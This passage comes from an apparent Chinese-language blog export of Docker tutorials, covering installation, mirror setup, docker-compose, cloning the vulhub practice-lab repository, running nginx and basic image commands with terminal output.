使用阿里云的源比较快sudo add-apt-repository "deb [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable"# 6. 更新软件包索引sudo apt-get -y update# 7. 安装docker相关的 docker-ce 社区版 ee企业版sudo apt-get -y install docker-ce docker-ce-cli containerd.io</code></pre><p>参考链接：<a href="https://dandelioncloud.cn/article/details/1440297267973664770#">https://dandelioncloud.cn/article/details/1440297267973664770#</a></p><h3 id="2-特权指令运行容器"><a href="#2-特权指令运行容器" class="headerlink" title="2.特权指令运行容器"></a>2.特权指令运行容器</h3><pre class=" language-xml"><code class="language-xml">sudo docker run -tid --name tree --privileged=true ubuntu:16.04 /sbin/initsudo docker exec -it tree /bin/bash</code></pre><p>参考链接：<a href="https://blog.csdn.net/yao00037/article/details/122688115">(7条消息) 终于找到了docker里面没有办法使用systemctl的解决方法了_yao00037的博客-CSDN博客_docker无法使用systemctl</a></p><h3 id="3-下载安装vim"><a href="#3-下载安装vim" class="headerlink" title="3. 下载安装vim"></a>3. 下载安装vim</h3><pre><code>1.复制目前的源mv /etc/apt/sources.list /etc/apt/sources.list.bak2.修改源中科大cat &lt;&lt;EOF &gt;/etc/apt/sources.listdeb http://mirrors.ustc.edu.cn/debian stable main contrib non-freedeb http://mirrors.ustc.edu.cn/debian stable-updates main contrib non-freeEOF3.更新源apt-get update4.下载vimapt-get install vim利用apt-get下载东西 到这为止5.备份恢复mv /etc/apt/sources.list.bak /etc/apt/sources.list</code></pre><p>参考链接：<a href="https://blog.csdn.net/weixin_44598727/article/details/108300731">(7条消息) 简单解决Docker中的镜像没有vim的问题（同时解决apt-get下载很慢的问题，原始的echo写入国内的源）_一只有点酸的程序员的博客-CSDN博客_aptget vim</a></p><p>参考链接：<a href="https://blog.csdn.net/qq_41739987/article/details/117875020">(7条消息) docker容器中下载vim指令的速度特别慢，解决方案_超哥CG_544的博客-CSDN博客</a></p><p>参考链接：<a href="https://cg544.blog.csdn.net/article/details/117874818?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-117874818-blog-123993514.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-117874818-blog-123993514.pc_relevant_default&utm_relevant_index=1">(7条消息) docker容器中无法使用vim指令的解决方案 vim: command not found_超哥CG_544的博客-CSDN博客_docker 不能用vim</a></p><h3 id="4-配置docker镜像加速"><a href="#4-配置docker镜像加速" class="headerlink" title="4.配置docker镜像加速"></a>4.配置docker镜像加速</h3><pre class=" language-xml"><code class="language-xml">方法一mkdir -p /etc/dockertee /etc/docker/daemon.json &lt;&lt;-'EOF'<span class="token entity" title="&#123;">&amp;#123;</span>  "registry-mirrors": ["https://mirror.ccs.tencentyun.com"]<span class="token entity" title="&#125;">&amp;#125;</span>EOFsystemctl daemon-reloadsystemctl restart docker方法二vim /etc/docker/daemon.json<span class="token entity" title="&#123;">&amp;#123;</span>"registry-mirrors": [  "https://mirror.ccs.tencentyun.com"]<span class="token entity" title="&#125;">&amp;#125;</span>sudo systemctl daemon-reloadsudo systemctl restart docker.serviceservice docker restartdocker info|grep Mirrors -A 1</code></pre><p>🖊注意事项：<strong>所有操作在容器外操作，在root权限下进行。</strong>🖊</p><p>参考链接：<a href="https://blog.csdn.net/weixin_44953227/article/details/109242166">(7条消息) 配置 Docker 镜像加速源地址_weixin_44953227的博客-CSDN博客_docker加速源配置</a></p><p>参考链接：<a href="https://moments.blog.csdn.net/article/details/103879687?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1-103879687-blog-124443675.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-1-103879687-blog-124443675.pc_relevant_default&utm_relevant_index=2">(7条消息) Ubuntu下修改docker镜像源_星球守护者的博客-CSDN博客_ubuntu修改docker源</a></p><p>参考链接：<code>Docker下载加速：Docker镜像下载加速、pip 下载加速、apt 下载加速</code><a href="https://blog.csdn.net/m0_37605642/article/details/124331652">https://blog.csdn.net/m0_37605642/article/details/124331652</a></p><h3 id="5-安装docker-compose"><a href="#5-安装docker-compose" class="headerlink" title="5.安装docker-compose"></a>5.安装docker-compose</h3><pre><code>1.安装pip3pip3 install pip -U -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com2.更新源sudo apt-get update3.安装docker-composepip3 install docker-compose</code></pre><p>参考链接：<a href="https://www.freesion.com/article/4589561535/">Ubuntu 下用pip安装docker-compose的一个方法（不妨试试） - 灰信网（软件开发博客聚合） (freesion.com)</a></p><h3 id="6-搭建vulhub-靶场"><a href="#6-搭建vulhub-靶场" class="headerlink" title="6.搭建vulhub 靶场"></a>6.搭建vulhub 靶场</h3><pre class=" language-xml"><code class="language-xml">git clone https://gitcode.net/mirrors/vulhub/vulhub.git</code></pre><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220518110233.png" alt="image-20220518110233786"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DockerCompose</title>
      <link href="/2022/08/31/DockerCompose/"/>
      <url>/2022/08/31/DockerCompose/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker-compose"><a href="#Docker-compose" class="headerlink" title="Docker-compose"></a>Docker-compose</h1><h2 id="1-安装docker-compose"><a href="#1-安装docker-compose" class="headerlink" title="1.安装docker-compose"></a>1.安装docker-compose</h2><pre class=" language-shell"><code class="language-shell">#加速下载https://get.daocloud.io/curl -L https://get.daocloud.io/docker/compose/releases/download/v2.5.1/docker-compose-`uname -s`-`uname -m` > /usr/local/bin/docker-composechmod +x /usr/local/bin/docker-compose</code></pre><h2 id="2-简介docker-compose"><a href="#2-简介docker-compose" class="headerlink" title="2.简介docker-compose"></a>2.简介docker-compose</h2><p>Compose 中有两个重要的概念：</p><ul><li>服务 (service)：一个应用的容器，实际上可以包括若干运行相同镜像的容器实例</li><li>项目 (project)：由一组关联的应用容器组成的一个完整业务单元，在 <code>docker-compose.yml</code> 文件中定义</li></ul><p><code>docker-compose.yml</code> 格式如下，注意：YAML 文件必须要键值之间的 <code>:</code> 后面必须有一个空格，缩进表示层级，要注意缩进<br> 有使用到的 volumes 和 networks 必须声明</p><h2 id="3-自定义docker-compose-yml"><a href="#3-自定义docker-compose-yml" class="headerlink" title="3.自定义docker-compose.yml"></a>3.自定义docker-compose.yml</h2><pre class=" language-yml"><code class="language-yml">version: "2.5.1"services:  tomcat: #服务名唯一    image: tomcat:9.0 #创建当前这个服务使用镜像    ports:      - 8080:8080  tomcat1:    image: tomcat:9.0    ports:      - 8081:8080</code></pre><pre class=" language-shell"><code class="language-shell">root@ubuntu:/home/docker-compose-test# docker-compose up -d[+] Running 3/3 ⠿ Network docker-compose-test_default      Created                                                              0.1s ⠿ Container docker-compose-test-tomcat1-1  Started                                                              1.7s ⠿ Container docker-compose-test-tomcat-1   Started                                                              2.7s</code></pre><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220522212702.png" alt="image-20220522212655694"></p><h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h2><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><code>视频链接：</code></p><p><a href="https://www.bilibili.com/video/BV1ZT4y1K75K?p=25">https://www.bilibili.com/video/BV1ZT4y1K75K?p=25</a></p><p><code>博客链接：</code></p><p><a href="https://www.cnblogs.com/aaronlinv/p/15270704.html">https://www.cnblogs.com/aaronlinv/p/15270704.html</a></p><p><a href="https://www.kuangstudy.com/zl/1485154067163824129#header1">https://www.kuangstudy.com/zl/1485154067163824129#header1</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker常见项目安装</title>
      <link href="/2022/08/30/Docker%E5%B8%B8%E8%A7%81%E9%A1%B9%E7%9B%AE%E5%AE%89%E8%A3%85/"/>
      <url>/2022/08/30/Docker%E5%B8%B8%E8%A7%81%E9%A1%B9%E7%9B%AE%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h2 id="docker-搭建nginx"><a href="#docker-搭建nginx" class="headerlink" title="docker 搭建nginx"></a>docker 搭建nginx</h2><blockquote><p>1.搜索nignx  docker search nginx</p></blockquote><pre class=" language-shell"><code class="language-shell">root@ubuntu:~# docker search nginxNAME                                              DESCRIPTION                                     STARS     OFFICIAL   AUTOMATEDnginx                                             Official build of Nginx.                        16808     [OK]       linuxserver/nginx                                 An Nginx container, brought to you by LinuxS…   168                  bitnami/nginx                                     Bitnami nginx Docker Image                      126                  [OK]ubuntu/nginx                                      Nginx, a high-performance reverse proxy & we…   48                   bitnami/nginx-ingress-controller                  Bitnami Docker Image for NGINX Ingress Contr…   18                   [OK]rancher/nginx-ingress-controller                                                                  10                   clearlinux/nginx                                  Nginx reverse proxy server with the benefits…   4                    ibmcom/nginx-ingress-controller                   Docker Image for IBM Cloud Private-CE (Commu…   4                    bitnami/nginx-ldap-auth-daemon                                                                    3                    rancher/nginx-ingress-controller-defaultbackend                                                   2                    bitnami/nginx-exporter                                                                            2                    circleci/nginx                                    This image is for internal use                </code></pre><blockquote><p>2.下载nginx镜像  docker pull nginx</p></blockquote><pre class=" language-shell"><code class="language-shell">root@ubuntu:~# docker pull nginxUsing default tag: latestlatest: Pulling from library/nginx214ca5fb9032: Pull complete 66eec13bb714: Pull complete 17cb812420e3: Pull complete 56fbf79cae7a: Pull complete c4547ad15a20: Pull complete d31373136b98: Pull complete Digest: sha256:2d17cc4981bf1e22a87ef3b3dd20fbb72c3868738e3f307662eb40e2630d4320Status: Downloaded newer image for nginx:latestdocker.io/library/nginx:latest</code></pre><blockquote><p>3.启动镜像 docker run –name nginx1 -p 3344:80 nginx</p></blockquote><pre class=" language-shell"><code class="language-shell">docker run --name nginx1 -p 3344:80 nginx--name 取别名为nginx1-p 主机端口 3344:容器端口 80 （nginx端口号为80） 实现主机端口到容器端口映射nginx镜像root@ubuntu:~#  docker run --name nginx1 -p 3344:80 nginx/docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration/docker-entrypoint.sh: Looking for shell scripts in /docker-entrypoint.d//docker-entrypoint.sh: Launching /docker-entrypoint.d/10-listen-on-ipv6-by-default.sh10-listen-on-ipv6-by-default.sh: info: Getting the checksum of /etc/nginx/conf.d/default.conf10-listen-on-ipv6-by-default.sh: info: Enabled listen on IPv6 in /etc/nginx/conf.d/default.conf/docker-entrypoint.sh: Launching /docker-entrypoint.d/20-envsubst-on-templates.sh/docker-entrypoint.sh: Launching /docker-entrypoint.d/30-tune-worker-processes.sh/docker-entrypoint.sh: Configuration complete; ready for start up2022/05/19 14:21:10 [notice] 1#1: using the "epoll" event method2022/05/19 14:21:10 [notice] 1#1: nginx/1.21.62022/05/19 14:21:10 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 2022/05/19 14:21:10 [notice] 1#1: OS: Linux 4.15.0-142-generic2022/05/19 14:21:10 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1024:40962022/05/19 14:21:10 [notice] 1#1: start worker processes2022/05/19 14:21:10 [notice] 1#1: start worker process 342022/05/19 14:21:10 [notice] 1#1: start worker process 35172.17.0.1 - - [19/May/2022:14:22:09 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.47.0" "-"</code></pre><p><img src="https://gitee.com/hexofox/foximage/raw/master/images/20220519222726.png" alt="image-20220519222726632"></p><blockquote><p>4.测试nginx是否开启  curl localhost:3344</p></blockquote><pre class=" language-html"><code class="language-html">root@ubuntu:~# curl localhost:3344<span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Welcome to nginx!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">html &amp;<span class="token hexcode">#123</span><span class="token punctuation">;</span> <span class="token property">color-scheme</span><span class="token punctuation">:</span> light dark<span class="token punctuation">;</span> &amp;<span class="token hexcode">#125</span><span class="token punctuation">;</span>body &amp;<span class="token hexcode">#123</span><span class="token punctuation">;</span> <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">35</span>em<span class="token punctuation">;</span> <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span> auto<span class="token punctuation">;</span><span class="token property">font-family</span><span class="token punctuation">:</span> Tahoma, Verdana, Arial, sans-serif<span class="token punctuation">;</span> &amp;<span class="token hexcode">#125</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Welcome to nginx!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>If you see this page, the nginx web server is successfully installed andworking. Further configuration is required.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>For online documentation and support please refer to<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://nginx.org/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>nginx.org<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>Commercial support is available at<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://nginx.com/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>nginx.com<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>em</span><span class="token punctuation">></span></span>Thank you for using nginx.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>em</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p><code>思考问题：</code>每次修改nginx配置都要进入 容器内，是很繁琐的事，还是<strong>更推荐使用</strong>容器卷技术**.</p><p>部署 Tomcat 可以参考 Docker Hub 官方文档：<a href="https://hub.docker.com/_/tomcat">https://hub.docker.com/_/tomcat</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker网络</title>
      <link href="/2022/08/28/Docker%E7%BD%91%E7%BB%9C/"/>
      <url>/2022/08/28/Docker%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Docker 命令</title>
      <link href="/2022/08/27/Docker-%E5%91%BD%E4%BB%A4/"/>
      <url>/2022/08/27/Docker-%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker-命令"><a href="#Docker-命令" class="headerlink" title="Docker 命令"></a>Docker 命令</h1><h2 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h2><p>参考文献：<a href="https://www.coonote.com/docker/docker-tutorial.html">docker中文文档 (coonote.com)</a></p><blockquote><p>docker version  #docker 版本</p></blockquote><pre class=" language-shell"><code class="language-shell">test@ubuntu:~$ docker versionClient: Docker Engine - Community Version:           20.10.7 API version:       1.41 Go version:        go1.13.15 Git commit:        f0df350 Built:             Wed Jun  2 11:56:47 2021 OS/Arch:           linux/amd64 Context:           default Experimental:      trueGot permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get http://%2Fvar%2Frun%2Fdocker.sock/v1.24/version: dial unix /var/run/docker.sock: connect: permission </code></pre><blockquote><p>docker info     #显示docker 详细信息</p></blockquote><pre class=" language-shell"><code class="language-shell">test@ubuntu:~$ sudo docker info[sudo] test 的密码： Client: Context:    default Debug Mode: false Plugins:  app: Docker App (Docker Inc., v0.9.1-beta3)  buildx: Build with BuildKit (Docker Inc., v0.5.1-docker)  scan: Docker Scan (Docker Inc., v0.8.0)Server: Containers: 2  Running: 0  Paused: 0  Stopped: 2 Images: 2 Server Version: 20.10.14 Storage Driver: overlay2  Backing Filesystem: extfs  Supports d_type: true  Native Overlay Diff: true  userxattr: false Logging Driver: json-file Cgroup Driver: cgroupfs Cgroup Version: 1 Plugins:  Volume: local  Network: bridge host ipvlan macvlan null overlay  Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog Swarm: inactive Runtimes: io.containerd.runc.v2 io.containerd.runtime.v1.linux runc Default Runtime: runc Init Binary: docker-init containerd version: 3df54a852345ae127d1fa3092b95168e4a88e2f8 runc version:  init version: de40ad0 Security Options:  apparmor  seccomp   Profile: default Kernel Version: 4.15.0-142-generic Operating System: Ubuntu Core 18 OSType: linux Architecture: x86_64 CPUs: 2 Total Memory: 1.924GiB Name: ubuntu ID: Z5RW:QJCL:7TC3:OWXK:VLMH:4UEY:VQP4:6PKH:B6NK:EF2M:4NUK:3OYO Docker Root Dir: /var/snap/docker/common/var-lib-docker Debug Mode: false Registry: https://index.docker.io/v1/ Labels: Experimental: false Insecure Registries:  127.0.0.0/8 Live Restore Enabled: false</code></pre><blockquote><p>docker  命令–help  #帮助命令</p></blockquote><pre class=" language-shell"><code class="language-shell">test@ubuntu:~$ docker images --helpUsage:  docker images [OPTIONS] [REPOSITORY[:TAG]]List imagesOptions:  -a, --all             Show all images (default hides intermediate images)      --digests         Show digests  -f, --filter filter   Filter output based on conditions provided      --format string   Pretty-print images using a Go template      --no-trunc        Don't truncate output  -q, --quiet           Only show image IDs</code></pre><h2 id="镜像命令"><a href="#镜像命令" class="headerlink" title="镜像命令"></a>镜像命令</h2><h3 id="查看镜像"><a href="#查看镜像" class="headerlink" title="查看镜像"></a>查看镜像</h3><blockquote><p>docker images  命令查看所有本地主机上的镜像。</p></blockquote><pre class=" language-shell"><code class="language-shell">docker images [参数] [镜像[:标签]]参数-a :显示所有镜像-q:显示镜像ID-aq:显示所有镜像ID</code></pre><blockquote><p>docker images -a </p></blockquote><pre class=" language-shell"><code class="language-shell">root@ubuntu:/home/test# docker images -aREPOSITORY      TAG       IMAGE ID       CREATED       SIZEvulhub/webmin   1.910     8a2b31a69f9a   2 years ago   315MBvulhub/samba    4.6.3     e37802d9a4e5   4 years ago   622MB</code></pre><blockquote><p>docker images -q</p></blockquote><pre class=" language-shell"><code class="language-shell">root@ubuntu:/home/test# docker images -q8a2b31a69f9ae37802d9a4e5</code></pre><blockquote><p>docker images -aq</p></blockquote><pre class=" language-shell"><code class="language-shell">root@ubuntu:/home/test# docker images -aq8a2b31a69f9ae37802d9a4e5</code></pre><blockquote><p>docker images  镜像名</p></blockquote><pre class=" language-shell"><code class="language-shell">root@ubuntu:/home/test# docker images vulhub/webminREPOSITORY      TAG       IMAGE ID       CREATED       SIZEvulhub/webmin   1.910     8a2b31a69f9a   2 years ago   315MB</code></pre><ul><li><strong>REPOSITORY</strong>：镜像名（镜像仓库源）。</li><li><strong>TAG</strong>：镜像的标签。</li><li><strong>IMAGE ID</strong>：镜像的 ID。</li><li><strong>CREATED</strong>：镜像的创建时间。</li><li><strong>SIZE</strong>：镜像的大小</li></ul><h3 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h3><blockquote><p>docker search 镜像名</p></blockquote><pre class=" language-shell"><code class="language-shell">root@ubuntu:/home/test# docker search mysqlNAME                           DESCRIPTION                                     STARS     OFFICIAL   AUTOMATEDmysql                          MySQL is a widely used, open-source relation…   12598     [OK]       mariadb                        MariaDB Server is a high performing open sou…   4840      [OK]       percona                        Percona Server is a fork of the MySQL relati…   576       [OK]       phpmyadmin                     phpMyAdmin - A web interface for MySQL and M…   540       [OK]       bitnami/mysql                  Bitnami MySQL Docker Image                      71                   [OK]linuxserver/mysql-workbench                                                    36                   linuxserver/mysql              A Mysql container, brought to you by LinuxSe…   35                   ubuntu/mysql                   MySQL open source fast, stable, multi-thread…   33                   circleci/mysql                 MySQL is a widely used, open-source relation…   25                   google/mysql                   MySQL server for Google Compute Engine          21                   [OK]rapidfort/mysql                RapidFort optimized, hardened image for mysql   12                   vmware/harbor-db               Mysql container for Harbor                      10                   bitnami/mysqld-exporter                                                        3                    ibmcom/mysql-s390x             Docker image for mysql-s390x                    2                    nasqueron/mysql                                                                1                    [OK]newrelic/mysql-plugin          New Relic Plugin for monitoring MySQL databa…   1                    [OK]vitess/mysqlctld               vitess/mysqlctld                                1                    [OK]cimg/mysql                                                                     0                    mirantis/mysql                                                                 0                    drud/mysql-local-57            ddev mysql local container                      0                    drud/mysql-docker-local-57     This repo has been deprecated, new tags are …   0                    drud/mysql                                                                     0                    drud/mysql-docker-local        docker containers for local womysql rk          0                    [OK]docksal/mysql                  MySQL service images for Docksal - https://d…   0                    silintl/mysql-backup-restore   Simple docker image to perform mysql backups…   0                    [OK]</code></pre><blockquote><p>docker search 镜像名:tag   版本</p></blockquote><pre class=" language-shell"><code class="language-shell">root@ubuntu:/home/test# docker search mysql:5.7NAME                                      DESCRIPTION                                     STARS     OFFICIAL   AUTOMATEDkiratalent/mysql                          Pinned copy of mysql:5.7.24                     1                    ahmedelshfie/spring-boot-mysql-rest-api   mysql:5.7                                       0                    xiao806852034/mysql57                     基于 mysql:5.7                                    0                    metatronx/mysql                           mysql:5.7 + druid account & database            0                    idyci/mysql                               mysql:5.7.25                                    0                    stsiwo/sts-blog-db                        base image mysql:5.7.28                         0                    framgiaciteam/mysql-256                   FROM mysql:5.7  CMD ["--block_encryption_mod…   0                    michaelzx/docker_msyql                    without ONLY_FULL_GROUP_BY base on mysql:5.7…   0                    [OK]llasuka/mysql                             mysql:5.7                                       0                    denghui/mysql                             mysql:5.7-tz.8                                  0                    [OK]alexmbarbosa/mysql5.7                     Based on official mysql:5.7 docker image        0                    alecchyi/mysql                            mysql:5.7 for demo                              0                    migs/mysql-5.7                            mysql:5.7 plus some basic enhancements          0                    [OK]variu/hyperledger-explorer-mysql          mysql:5.7.23 for hyperledger explorer           0                    zhjs/mysql                                mysql:5.7                                       0                    crbanman/mysql-tmpfs                      A docker image based off of mysql:5.7 that m…   0                    doctorva/mysql_fede                       Based on Mysql:5.7 and add new configuration…   0                    vigasin/mysql                             Clone of official mysql:5.7 image, that allo…   0                    beyondray/kbengine-mysql                  kbengine auto-build env from mysql:5.7          0                    [OK]kamatimaru/mysql57-ja                     Added Japanese support settings to mysql:5.7…   0                    zeq9069/mysql_service                     mysql:5.7                                       0                    liyupei/mysql                             Mysql:5.7                                       0                    dockerzm/mysql                            docker run --name mysql -e MYSQL_ROOT_PASSWO…   0                    ruyli/mysql                               mysql:5.7                                       0                    zhangruihuai/mysql-node-nginx-python      based on mysql:5.7  MySQL 5.7 NodeJS v14.18.…   0                    </code></pre><h3 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h3><blockquote><p>docker pull </p></blockquote><pre class=" language-shell"><code class="language-shell">docker pull [参数] 镜像名[:标签]如果不输入标签，默认拉取最新版镜像。参数-a：拉取镜像的所有标签。-q：抑制详细输出。</code></pre><blockquote><p>docker pull  镜像名</p></blockquote><pre class=" language-shell"><code class="language-shell">root@ubuntu:/home/test# docker pull redisUsing default tag: latestlatest: Pulling from library/redis214ca5fb9032: Pull complete 9eeabf2ad250: Pull complete b8eb79a9f3c4: Pull complete 0ba9bf1b547e: Pull complete 2d2e2b28e876: Pull complete 3e45fcdfb831: Pull complete Digest: sha256:ad0705f2e2344c4b642449e658ef4669753d6eb70228d46267685045bf932303Status: Downloaded newer image for redis:latestdocker.io/library/redis:latest</code></pre><blockquote><p>docker pull 镜像名:标签==版本    标签在仓库中必须存在</p></blockquote><pre class=" language-shell"><code class="language-shell">root@ubuntu:/home/test# docker pull redis:5.05.0: Pulling from library/redis214ca5fb9032: Already exists 9eeabf2ad250: Already exists b8eb79a9f3c4: Already exists 2ac47d0ba268: Pull complete ca8e8791a6b0: Pull complete bb6819679d20: Pull complete Digest: sha256:d0d7f265d30579f89017dc20e383799c3dc8d16abd24ec409867e7045f95e2b8Status: Downloaded newer image for redis:5.0docker.io/library/redis:5.0</code></pre><h3 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h3><blockquote><p>docker rmi</p></blockquote><pre class=" language-shell"><code class="language-shell">docker rmi [参数] 镜像 [镜像...]参数-f:强制删除</code></pre><blockquote><p>docker rmi 镜像的 ID  （删除一个）</p></blockquote><pre class=" language-shell"><code class="language-shell">root@ubuntu:/home/test# docker images -aREPOSITORY      TAG       IMAGE ID       CREATED       SIZEredis           5.0       972767e7d959   7 days ago    110MBredis           latest    1ca2c2a1b554   7 days ago    117MBvulhub/webmin   1.910     8a2b31a69f9a   2 years ago   315MBvulhub/samba    4.6.3     e37802d9a4e5   4 years ago   622MBroot@ubuntu:/home/test# docker rmi 972767e7d959Untagged: redis:5.0Untagged: redis@sha256:d0d7f265d30579f89017dc20e383799c3dc8d16abd24ec409867e7045f95e2b8Deleted: sha256:972767e7d9595252e068f17c279ac78dbdcea0a11ff663e855908630084bed22Deleted: sha256:0c03267de98e2734f9a0edb2be8e82dee55d3f281d9e000115a9d7ca6c8f21bdDeleted: sha256:8581fbd48ca1b6bc5396eee05c3ca31b424c8d8cfb1ad6f8f63f0e127318859bDeleted: sha256:aaf36423019db3bbe07f446db8a089fcc0e2836001521b02ec176c1a77a48972root@ubuntu:/home/test# docker images -aREPOSITORY      TAG       IMAGE ID       CREATED       SIZEredis           latest    1ca2c2a1b554   7 days ago    117MBvulhub/webmin   1.910     8a2b31a69f9a   2 years ago   315MBvulhub/samba    4.6.3     e37802d9a4e5   4 years ago   622MBroot@ubuntu:/home/test# docker images -aREPOSITORY      TAG       IMAGE ID       CREATED       SIZEredis           latest    1ca2c2a1b554   7 days ago    117MBvulhub/webmin   1.910     8a2b31a69f9a   2 years ago   315MBvulhub/samba    4.6.3     e37802d9a4e5   4 years ago   622MBroot@ubuntu:/home/test# docker rmi redisUntagged: redis:latestUntagged: redis@sha256:ad0705f2e2344c4b642449e658ef4669753d6eb70228d46267685045bf932303Deleted: sha256:1ca2c2a1b554474b067257607aa811d191bd3314cb4c31f73eee7d97bed3ff98Deleted: sha256:26c143f2d100c9ef3c9052123a1bad672d504645b0ddec5d41664b4bd03b4b52Deleted: sha256:3d4b34feebc0891de8e4275e54aa3b575ab7ed2b58d88064b5785b123dc1fc76Deleted: sha256:36eed9d309a328156d6569c870cd2fc493dc8700c5412e69a3ff19e535962b83Deleted: sha256:a8fb85c4ee4f9bed694f125932ec8778b6957231a1ce991433cb3260b3564a01Deleted: sha256:b97a4adab2d5fa2d33b61addd14c1ea96279f2f76f5bc5a72609ed679778cd4eDeleted: sha256:fd95118eade99a75b949f634a0994e0f0732ff18c2573fabdfc8d4f95b092f0eroot@ubuntu:/home/test# docker images -aREPOSITORY      TAG       IMAGE ID       CREATED       SIZEvulhub/webmin   1.910     8a2b31a69f9a   2 years ago   315MBvulhub/samba    4.6.3     e37802d9a4e5   4 years ago   622MB</code></pre><blockquote><p>docker rmi 镜像id  镜像id  ……   (删除多个 以空格 分开)</p></blockquote><pre class=" language-shell"><code class="language-shell">root@ubuntu:/home/test# docker images -aREPOSITORY      TAG       IMAGE ID       CREATED       SIZEredis           5.0       972767e7d959   7 days ago    110MBmysql           5.7       a3d35804fa37   8 days ago    462MBvulhub/webmin   1.910     8a2b31a69f9a   2 years ago   315MBvulhub/samba    4.6.3     e37802d9a4e5   4 years ago   622MBroot@ubuntu:/home/test# docker rmi   972767e7d959 a3d35804fa37Untagged: redis:5.0Untagged: redis@sha256:d0d7f265d30579f89017dc20e383799c3dc8d16abd24ec409867e7045f95e2b8Deleted: sha256:972767e7d9595252e068f17c279ac78dbdcea0a11ff663e855908630084bed22Deleted: sha256:0c03267de98e2734f9a0edb2be8e82dee55d3f281d9e000115a9d7ca6c8f21bdDeleted: sha256:8581fbd48ca1b6bc5396eee05c3ca31b424c8d8cfb1ad6f8f63f0e127318859bDeleted: sha256:aaf36423019db3bbe07f446db8a089fcc0e2836001521b02ec176c1a77a48972Deleted: 